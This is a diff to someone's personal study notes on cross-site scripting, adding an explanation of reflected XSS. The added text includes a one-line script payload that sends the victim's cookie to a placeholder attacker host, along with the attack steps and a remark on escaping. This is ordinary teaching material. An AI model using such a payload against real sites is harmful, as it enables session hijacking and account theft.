@@ -1,7 +1,7 @@
 ---
 related to:
 created: 2025-11-30, 21:05
-updated: 2025-12-08T16:14
+updated: 2025-12-08T16:28
 completed: false
 ---
 ## basic information
@@ -80,7 +80,19 @@ the goals of XSS can be:
 - *reflected XSS*: the injection happens in a parameter used by the page to dinamically display infomation to the user
 >[!example] example of reflected xss
 ![[Pasted image 20251208160948.png]]
-the vulnerability is that the website has a response script that directly echoes the user’s `keyword` parameter into the HTML response, without any sanitization or enc
+the vulnerability is that the website has a response script that directly echoes the user’s `keyword` parameter into the HTML response, without any sanitization or encoding
+>- the attacker crafts a malicious link (to the vulnerable site) containing the XSS payload, that is designed to read the cookie and make a request to the attacker’s server. in this case, the payload is:
+>```html
+><script>window.location='http://attacker/cookie' + document.cookie</script>
+>```
+>- the attacker sends the URL to the victim, that executes it sending a GET request to the vulnerable site with the malicious payload
+>- the vulnerable site executes its vulnerable response script, concatenating the raw, uninvalidated payload into the HTML response
+>	- while it can make sense to echo the search result for client-side logging/tracking, but it should be escaped (escaping characters like `<>"'^&`)
+>- when the victim’s browser receives the response, it starts rendering the page. when it gets to the `<script>` tag, it executes the code immediately, sending a GET request to the attacker’s server with its cookie as a parameter
 
 - *stored XSS*: the injection is stored in a page of the web application, and then displayed to users accessing such a page
+>[!example] example of stored XSS
+![[Pasted image 20251208162836.png]]
+pretty self explanatory
+
 - *DOM-based XSS*: the injection happens in a parameter used by a script running within the page itself
